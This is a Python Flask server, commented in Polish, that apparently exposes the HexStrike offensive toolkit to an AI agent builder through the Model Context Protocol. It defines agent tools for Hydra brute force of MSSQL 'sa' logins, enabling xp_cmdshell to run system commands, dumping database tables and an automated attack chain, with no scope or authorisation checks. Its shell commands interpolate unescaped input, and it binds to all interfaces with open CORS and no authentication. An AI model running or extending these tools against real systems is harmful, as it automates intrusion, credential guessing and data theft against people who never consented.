#!/usr/bin/env python3
"""
HexStrike MCP Adapter
Adapter MCP (Model Context Protocol) dla Hexstrike AI
Łączy Hexstrike z OpenAI Agent Builder
"""

from flask import Flask, request, jsonify, Response
import requests
import json
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Konfiguracja
HEXSTRIKE_BASE_URL = "http://127.0.0.1:8888"
MCP_PORT = 9999  # Inny port niż Hexstrike

# Definicje narzędzi MCP
TOOLS = [
    {
        "name": "nmap_scan",
        "description": "Wykonuje skanowanie portów i usług za pomocą Nmap. Identyfikuje otwarte porty, usługi i ich wersje.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Adres IP lub domena do skanowania (np. 192.168.1.1 lub example.com)"
                },
                "options": {
                    "type": "string",
                    "description": "Opcje Nmap (np. '-sV' dla wykrywania wersji usług)"
                }
            }
        }
    },
    {
        "name": "subfinder_scan",
        "description": "Wyszukuje subdomeny dla podanej domeny używając Subfinder. Przydatne w rekonesansie.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "domain": {
                    "type": "string",
                    "description": "Domena główna do skanowania (np. example.com)"
                }
            }
        }
    },
    {
        "name": "gobuster_scan",
        "description": "Bruteforce katalogów i plików na serwerze webowym za pomocą Gobuster.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "URL do przeskanowania (np. http://example.com)"
                },
                "wordlist": {
                    "type": "string",
                    "description": "Ścieżka do wordlisty"
                }
            }
        }
    },
    {
        "name": "nuclei_scan",
        "description": "Skanuje podatności za pomocą Nuclei templates. Wykrywa CVE, misconfigurations i inne podatności.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "URL lub IP do przeskanowania"
                },
                "severity": {
                    "type": "string",
                    "description": "Poziom severity: critical, high, medium, low"
                }
            }
        }
    },
    {
        "name": "sqlmap_test",
        "description": "Testuje podatność SQL injection na podanym URL z parametrami.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "URL z parametrem do przetestowania (np. http://example.com/page?id=1)"
                },
                "cookie": {
                    "type": "string",
                    "description": "Cookie sesji"
                }
            }
        }
    },
    {
        "name": "httpx_probe",
        "description": "Sprawdza aktywne hosty i serwery HTTP/HTTPS za pomocą httpx.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "targets": {
                    "type": "string",
                    "description": "Lista hostów (jeden na linię lub rozdzielone przecinkami)"
                }
            }
        }
    },
    {
        "name": "katana_crawl",
        "description": "Crawluje stronę internetową i zbiera wszystkie URLe za pomocą Katana.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "URL startowy do crawlowania"
                },
                "depth": {
                    "type": "integer",
                    "description": "Głębokość crawlowania (np. 3)"
                }
            }
        }
    },
    {
        "name": "smart_scan",
        "description": "AI-powered inteligentne skanowanie. Automatycznie wybiera i wykonuje odpowiednie narzędzia dla celu.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Cel do przeskanowania (IP/domena/URL)"
                },
                "scope": {
                    "type": "string",
                    "description": "Zakres: reconnaissance, vulnerability, exploitation"
                }
            }
        }
    },
    {
        "name": "wpscan",
        "description": "Skanuje witrynę WordPress pod kątem podatności, wtyczek i motywów.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "URL witryny WordPress"
                }
            }
        }
    },
    {
        "name": "ffuf_fuzzer",
        "description": "Fast web fuzzer - fuzzing katalogów, parametrów, subdomen za pomocą ffuf.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "URL z miejscem FUZZ do zastąpienia (np. http://example.com/FUZZ)"
                },
                "wordlist": {
                    "type": "string",
                    "description": "Ścieżka do wordlisty"
                }
            }
        }
    },
    {
        "name": "mssql_login_bruteforce",
        "description": "Bruteforce loginu do MS SQL Server (port 1433) za pomocą Hydra. Testuje różne kombinacje użytkownik/hasło.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Adres IP serwera SQL (np. 192.168.1.100)"
                },
                "username": {
                    "type": "string",
                    "description": "Nazwa użytkownika lub ścieżka do listy użytkowników (np. 'sa')"
                },
                "password_list": {
                    "type": "string",
                    "description": "Ścieżka do wordlisty z hasłami"
                }
            }
        }
    },
    {
        "name": "mssql_enum",
        "description": "Enumeracja MS SQL Server - sprawdza wersję, bazy danych, uprawnienia, użytkowników. Używa nmap scripts.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Adres IP serwera SQL"
                },
                "port": {
                    "type": "integer",
                    "description": "Port SQL Server (np. 1433)"
                }
            }
        }
    },
    {
        "name": "mssql_query_execute",
        "description": "Wykonuje SQL query na MS SQL Server. WYMAGA credentials. Może wyciągać dane, sprawdzać strukturę bazy.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Adres IP serwera SQL"
                },
                "username": {
                    "type": "string",
                    "description": "Nazwa użytkownika SQL"
                },
                "password": {
                    "type": "string",
                    "description": "Hasło użytkownika SQL"
                },
                "query": {
                    "type": "string",
                    "description": "SQL query do wykonania (np. 'SELECT @@version')"
                },
                "database": {
                    "type": "string",
                    "description": "Nazwa bazy danych"
                }
            }
        }
    },
    {
        "name": "mssql_xp_cmdshell",
        "description": "Próbuje wykonać system command na SQL Server przez xp_cmdshell. Wymaga uprawnień sysadmin.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Adres IP serwera SQL"
                },
                "username": {
                    "type": "string",
                    "description": "Nazwa użytkownika SQL"
                },
                "password": {
                    "type": "string",
                    "description": "Hasło użytkownika SQL"
                },
                "command": {
                    "type": "string",
                    "description": "System command do wykonania (np. 'whoami', 'ipconfig')"
                }
            }
        }
    },
    {
        "name": "database_dump",
        "description": "Dumpuje zawartość tabel z bazy danych. Wyciąga wszystkie dane z wybranych tabel.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Adres IP serwera SQL"
                },
                "username": {
                    "type": "string",
                    "description": "Nazwa użytkownika"
                },
                "password": {
                    "type": "string",
                    "description": "Hasło"
                },
                "database": {
                    "type": "string",
                    "description": "Nazwa bazy danych"
                },
                "tables": {
                    "type": "string",
                    "description": "Tabele do zrzutu, rozdzielone przecinkami lub 'all' dla wszystkich"
                }
            }
        }
    },
    {
        "name": "smb_enum",
        "description": "Enumeracja SMB shares i informacji o systemie Windows. Często idzie w parze z SQL Server na Windows.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Adres IP serwera Windows"
                }
            }
        }
    },
    {
        "name": "automated_sql_attack",
        "description": "Automatyczny atak na SQL Server: 1) Enum 2) Bruteforce 3) Jeśli sukces -> Query execution 4) Próba xp_cmdshell.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Adres IP serwera SQL"
                },
                "aggressive": {
                    "type": "boolean",
                    "description": "Tryb aggressive - więcej testów, dłużej trwa"
                }
            }
        }
    }
]

# Mapowanie narzędzi MCP na endpointy Hexstrike
TOOL_ENDPOINTS = {
    "nmap_scan": "/api/tools/nmap",
    "subfinder_scan": "/api/tools/subfinder",
    "gobuster_scan": "/api/tools/gobuster",
    "nuclei_scan": "/api/tools/nuclei",
    "sqlmap_test": "/api/tools/sqlmap",
    "httpx_probe": "/api/tools/httpx",
    "katana_crawl": "/api/tools/katana",
    "smart_scan": "/api/intelligence/smart-scan",
    "wpscan": "/api/tools/wpscan",
    "ffuf_fuzzer": "/api/tools/ffuf",
    # SQL Server attack tools
    "mssql_login_bruteforce": "/api/tools/hydra",
    "mssql_enum": "/api/tools/nmap-advanced",
    "mssql_query_execute": "/api/command",
    "mssql_xp_cmdshell": "/api/command",
    "database_dump": "/api/command",
    "smb_enum": "/api/tools/enum4linux-ng",
    "automated_sql_attack": "/api/intelligence/create-attack-chain"
}

@app.route("/", methods=["GET"])
def home():
    """Info endpoint"""
    return jsonify({
        "name": "HexStrike MCP Adapter",
        "version": "1.0.0",
        "description": "MCP adapter dla Hexstrike AI - kompatybilny z OpenAI Agent Builder",
        "mcp_protocol": "2024-11-05",
        "hexstrike_url": HEXSTRIKE_BASE_URL,
        "endpoints": {
            "mcp_jsonrpc": "/mcp (POST - JSON-RPC 2.0)",
            "mcp_sse": "/mcp/sse (GET - Server-Sent Events)",
            "tools_list": "/mcp/v1/tools/list (POST)",
            "tools_call": "/mcp/v1/tools/call (POST)"
        },
        "available_tools": len(TOOLS),
        "status": "ready"
    })

@app.route("/mcp", methods=["POST", "OPTIONS"])
def mcp_jsonrpc():
    """Główny endpoint MCP (JSON-RPC 2.0)"""
    # CORS
    if request.method == "OPTIONS":
        response = jsonify({"status": "ok"})
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
        return response
    
    try:
        data = request.json
        method = data.get("method")
        params = data.get("params", {})
        req_id = data.get("id", 1)
        
        logger.info(f"MCP Request: method={method}, params={params}")
        
        if method == "initialize":
            # Zwróć wersję protokołu którą klient wysłał
            client_version = params.get("protocolVersion", "2024-11-05")
            result = {
                "protocolVersion": client_version,
                "capabilities": {
                    "tools": {
                        "listChanged": False
                    }
                },
                "serverInfo": {
                    "name": "hexstrike-mcp-adapter",
                    "version": "1.0.0"
                }
            }
            logger.info(f"Initialized with protocol version: {client_version}")
        elif method == "notifications/initialized":
            # To jest notyfikacja, nie wymaga odpowiedzi result
            logger.info("Client sent initialized notification")
            response = jsonify({
                "jsonrpc": "2.0",
                "id": req_id
            })
            response.headers.add("Access-Control-Allow-Origin", "*")
            return response
        elif method == "tools/list":
            result = {"tools": TOOLS}
            logger.info(f"Returning {len(TOOLS)} tools")
        elif method == "tools/call":
            result = call_hexstrike_tool(params.get("name"), params.get("arguments", {}))
        else:
            response = jsonify({
                "jsonrpc": "2.0",
                "id": req_id,
                "error": {
                    "code": -32601,
                    "message": f"Method not found: {method}"
                }
            })
            response.headers.add("Access-Control-Allow-Origin", "*")
            return response
        
        response = jsonify({
            "jsonrpc": "2.0",
            "id": req_id,
            "result": result
        })
        response.headers.add("Access-Control-Allow-Origin", "*")
        return response
        
    except Exception as e:
        logger.error(f"Error: {str(e)}", exc_info=True)
        response = jsonify({
            "jsonrpc": "2.0",
            "id": req_id if 'req_id' in locals() else 1,
            "error": {
                "code": -32603,
                "message": f"Internal error: {str(e)}"
            }
        })
        response.headers.add("Access-Control-Allow-Origin", "*")
        return response

@app.route("/mcp/v1/tools/list", methods=["POST", "OPTIONS"])
def tools_list():
    """Lista dostępnych narzędzi"""
    if request.method == "OPTIONS":
        response = jsonify({"status": "ok"})
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        return response
    
    response = jsonify({"tools": TOOLS})
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

@app.route("/mcp/v1/tools/call", methods=["POST", "OPTIONS"])
def tools_call():
    """Wykonuje narzędzie"""
    if request.method == "OPTIONS":
        response = jsonify({"status": "ok"})
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        return response
    
    try:
        data = request.json
        tool_name = data.get("name")
        arguments = data.get("arguments", {})
        
        result = call_hexstrike_tool(tool_name, arguments)
        response = jsonify(result)
        response.headers.add("Access-Control-Allow-Origin", "*")
        return response
        
    except Exception as e:
        response = jsonify({
            "content": [{
                "type": "text",
                "text": f"Błąd wykonania narzędzia: {str(e)}"
            }],
            "isError": True
        })
        response.headers.add("Access-Control-Allow-Origin", "*")
        return response

@app.route("/mcp/sse", methods=["GET"])
def mcp_sse():
    """Server-Sent Events endpoint dla MCP"""
    def event_stream():
        # Wyślij info o endpointach
        yield f"data: {json.dumps({'type': 'endpoint', 'jsonrpc': f'http://127.0.0.1:{MCP_PORT}/mcp'})}\n\n"
    
    return Response(event_stream(), mimetype="text/event-stream")

def call_hexstrike_tool(tool_name, arguments):
    """Wywołuje narzędzie Hexstrike przez jego API"""
    try:
        if tool_name not in TOOL_ENDPOINTS:
            return {
                "content": [{
                    "type": "text",
                    "text": f"❌ Nieznane narzędzie: {tool_name}"
                }],
                "isError": True
            }
        
        # Specjalna obsługa dla SQL tools
        if tool_name == "mssql_login_bruteforce":
            return handle_mssql_bruteforce(arguments)
        elif tool_name == "mssql_enum":
            return handle_mssql_enum(arguments)
        elif tool_name == "mssql_query_execute":
            return handle_mssql_query(arguments)
        elif tool_name == "mssql_xp_cmdshell":
            return handle_mssql_cmdshell(arguments)
        elif tool_name == "database_dump":
            return handle_database_dump(arguments)
        elif tool_name == "automated_sql_attack":
            return handle_automated_sql_attack(arguments)
        
        endpoint = TOOL_ENDPOINTS[tool_name]
        url = f"{HEXSTRIKE_BASE_URL}{endpoint}"
        
        logger.info(f"Calling Hexstrike: {url} with args: {arguments}")
        
        # Wywołaj Hexstrike API
        response = requests.post(url, json=arguments, timeout=300)
        
        if response.status_code == 200:
            result_data = response.json()
            return {
                "content": [{
                    "type": "text",
                    "text": f"✅ Wynik wykonania {tool_name}:\n\n{json.dumps(result_data, indent=2, ensure_ascii=False)}"
                }]
            }
        else:
            return {
                "content": [{
                    "type": "text",
                    "text": f"❌ Błąd HTTP {response.status_code}: {response.text}"
                }],
                "isError": True
            }
            
    except requests.exceptions.Timeout:
        return {
            "content": [{
                "type": "text",
                "text": f"⏱️ Timeout - narzędzie {tool_name} wykonuje się dłużej niż 5 minut"
            }],
            "isError": True
        }
    except Exception as e:
        logger.error(f"Error calling Hexstrike: {str(e)}")
        return {
            "content": [{
                "type": "text",
                "text": f"❌ Błąd wywołania Hexstrike: {str(e)}"
            }],
            "isError": True
        }

def handle_mssql_bruteforce(args):
    """Bruteforce MSSQL login przez Hydra"""
    target = args.get("target")
    username = args.get("username", "sa")
    password_list = args.get("password_list", "/usr/share/wordlists/rockyou.txt")
    
    # Wywołaj Hydra przez Hexstrike
    hydra_args = {
        "target": target,
        "service": "mssql",
        "username": username,
        "password_list": password_list,
        "port": 1433
    }
    
    response = requests.post(f"{HEXSTRIKE_BASE_URL}/api/tools/hydra", json=hydra_args, timeout=600)
    
    if response.status_code == 200:
        result = response.json()
        return {
            "content": [{
                "type": "text",
                "text": f"🔐 Wyniki bruteforce MSSQL na {target}:\n\n{json.dumps(result, indent=2, ensure_ascii=False)}"
            }]
        }
    else:
        return {
            "content": [{
                "type": "text",
                "text": f"❌ Błąd podczas bruteforce: {response.text}"
            }],
            "isError": True
        }

def handle_mssql_enum(args):
    """Enumeracja MSSQL za pomocą nmap NSE scripts"""
    target = args.get("target")
    port = args.get("port", 1433)
    
    nmap_args = {
        "target": target,
        "options": f"-p {port} --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info"
    }
    
    response = requests.post(f"{HEXSTRIKE_BASE_URL}/api/tools/nmap", json=nmap_args, timeout=300)
    
    if response.status_code == 200:
        result = response.json()
        return {
            "content": [{
                "type": "text",
                "text": f"🔍 Enumeracja MSSQL na {target}:{port}:\n\n{json.dumps(result, indent=2, ensure_ascii=False)}"
            }]
        }
    else:
        return {
            "content": [{
                "type": "text",
                "text": f"❌ Błąd enumeracji: {response.text}"
            }],
            "isError": True
        }

def handle_mssql_query(args):
    """Wykonanie SQL query przez mssqlclient.py (Impacket)"""
    target = args.get("target")
    username = args.get("username")
    password = args.get("password")
    query = args.get("query")
    database = args.get("database", "master")
    
    # Buduj komendę dla Hexstrike
    command = f"mssqlclient.py {username}:{password}@{target} -db {database} -Q \"{query}\""
    
    cmd_args = {
        "command": command,
        "timeout": 60
    }
    
    response = requests.post(f"{HEXSTRIKE_BASE_URL}/api/command", json=cmd_args, timeout=120)
    
    if response.status_code == 200:
        result = response.json()
        return {
            "content": [{
                "type": "text",
                "text": f"💾 Wynik SQL query na {target}:\n\n{json.dumps(result, indent=2, ensure_ascii=False)}"
            }]
        }
    else:
        return {
            "content": [{
                "type": "text",
                "text": f"❌ Błąd wykonania query: {response.text}"
            }],
            "isError": True
        }

def handle_mssql_cmdshell(args):
    """Wykonanie system command przez xp_cmdshell"""
    target = args.get("target")
    username = args.get("username")
    password = args.get("password")
    command = args.get("command")
    
    # Najpierw włącz xp_cmdshell, potem wykonaj command
    enable_cmd = f"mssqlclient.py {username}:{password}@{target} -Q \"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '{command}';\""
    
    cmd_args = {
        "command": enable_cmd,
        "timeout": 60
    }
    
    response = requests.post(f"{HEXSTRIKE_BASE_URL}/api/command", json=cmd_args, timeout=120)
    
    if response.status_code == 200:
        result = response.json()
        return {
            "content": [{
                "type": "text",
                "text": f"⚡ Wynik xp_cmdshell na {target}:\n\n{json.dumps(result, indent=2, ensure_ascii=False)}"
            }]
        }
    else:
        return {
            "content": [{
                "type": "text",
                "text": f"❌ Błąd xp_cmdshell (brak uprawnień?): {response.text}"
            }],
            "isError": True
        }

def handle_database_dump(args):
    """Dump bazy danych"""
    target = args.get("target")
    username = args.get("username")
    password = args.get("password")
    database = args.get("database")
    tables = args.get("tables", "all")
    
    if tables == "all":
        query = f"SELECT name FROM {database}.sys.tables"
    else:
        query = f"SELECT * FROM {tables}"
    
    command = f"mssqlclient.py {username}:{password}@{target} -db {database} -Q \"{query}\""
    
    cmd_args = {
        "command": command,
        "timeout": 120
    }
    
    response = requests.post(f"{HEXSTRIKE_BASE_URL}/api/command", json=cmd_args, timeout=180)
    
    if response.status_code == 200:
        result = response.json()
        return {
            "content": [{
                "type": "text",
                "text": f"📦 Database dump z {database} na {target}:\n\n{json.dumps(result, indent=2, ensure_ascii=False)}"
            }]
        }
    else:
        return {
            "content": [{
                "type": "text",
                "text": f"❌ Błąd dump: {response.text}"
            }],
            "isError": True
        }

def handle_automated_sql_attack(args):
    """Automatyczny atak na SQL Server - chain attack"""
    target = args.get("target")
    aggressive = args.get("aggressive", False)
    
    attack_chain = {
        "target": target,
        "chain": [
            {"tool": "nmap", "params": {"target": target, "options": "-p 1433 --script ms-sql-info"}},
            {"tool": "hydra", "params": {"target": target, "service": "mssql", "username": "sa"}},
            {"tool": "mssqlclient", "params": {"query": "SELECT @@version"}},
            {"tool": "xp_cmdshell", "params": {"command": "whoami"}}
        ],
        "aggressive": aggressive
    }
    
    response = requests.post(f"{HEXSTRIKE_BASE_URL}/api/intelligence/create-attack-chain", json=attack_chain, timeout=900)
    
    if response.status_code == 200:
        result = response.json()
        return {
            "content": [{
                "type": "text",
                "text": f"🎯 Automated SQL Attack na {target}:\n\n{json.dumps(result, indent=2, ensure_ascii=False)}"
            }]
        }
    else:
        return {
            "content": [{
                "type": "text",
                "text": f"❌ Błąd automated attack: {response.text}"
            }],
            "isError": True
        }

if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║       🚀 HexStrike MCP Adapter                              ║
║       Adapter dla OpenAI Agent Builder                      ║
╚══════════════════════════════════════════════════════════════╝

✅ MCP Server URL: http://127.0.0.1:{MCP_PORT}/mcp
📡 SSE Endpoint: http://127.0.0.1:{MCP_PORT}/mcp/sse
🔗 Hexstrike Backend: {HEXSTRIKE_BASE_URL}
🛠️  Dostępnych narzędzi: {len(TOOLS)}

Aby podłączyć do OpenAI Agent Builder:
1. W Agent Builder → Tools → MCP Servers
2. Add MCP Server
3. URL: http://127.0.0.1:{MCP_PORT}/mcp
4. Save

Uruchamianie...
""")
    
    app.run(host="0.0.0.0", port=MCP_PORT, debug=False)
